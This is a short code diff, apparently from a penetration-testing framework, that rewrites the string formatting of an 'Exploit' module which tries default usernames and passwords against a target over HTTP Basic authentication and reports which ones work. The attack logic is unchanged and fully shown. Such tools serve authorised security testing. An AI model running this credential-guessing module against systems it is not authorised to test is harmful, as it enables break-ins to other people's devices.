@@ -44,24 +44,24 @@ class Exploit(HTTPClient):
 
     def run(self) -> None:
         import base64
-        print_status("Trying default credentials on {}:{}...".format(self.target, self.port))
+        print_status(f"Trying default credentials on {self.target}:{self.port}...")
         found = False
         for username, password in _DEFAULT_CREDENTIALS:
-            token = base64.b64encode("{}:{}".format(username, password).encode()).decode()
+            token = base64.b64encode(f"{username}:{password}".encode()).decode()
             resp = self.http_request(
                 method="GET",
                 path="/",
-                headers={"Authorization": "Basic {}".format(token)},
+                headers={"Authorization": f"Basic {token}"},
             )
             if resp and resp.status_code == 200:
                 text = resp.text or ""
                 if "login" not in text.lower():
-                    print_success("Valid credentials: {}:{}".format(username, password))
+                    print_success(f"Valid credentials: {username}:{password}")
                     found = True
                     if self.stop_on_success:
                         return
             code = resp.status_code if resp else "no response"
-            print_status("  {}:{} — {}".format(username, password, code))
+            print_status(f"  {username}:{password} — {code}")
 
         if not found:
             print_error("No default credentials accepted")
